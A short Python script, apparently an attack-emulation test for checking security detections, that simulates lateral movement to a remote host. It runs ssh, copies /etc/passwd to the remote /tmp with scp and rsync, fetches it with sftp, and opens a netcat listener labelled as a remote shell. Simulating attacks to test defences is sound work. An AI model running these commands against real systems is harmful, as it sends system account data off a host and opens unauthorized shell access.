import sys
import common


def main(remote_host=None):
    remote_host = remote_host or common.find_remote_host()
    common.log("Attempting to laterally move to %s" % remote_host)

    remote_host = common.get_ipv4_address(remote_host)
    common.log("Using ip address %s" % remote_host)

    commands = [
        "ssh {host} 'uname -a'",
        "scp /etc/passwd {host}:/tmp",
        "rsync /etc/passwd {host}:/tmp",
        "sftp {host}:/tmp/passwd",
    ]

    for command in commands:
        common.execute(command.format(host=remote_host))

    # Remote shell
    common.execute(["nc", "-lp", "12345"], timeout=5, kill=True)


if __name__ == "__main__":
    exit(main(*sys.argv[1:]))
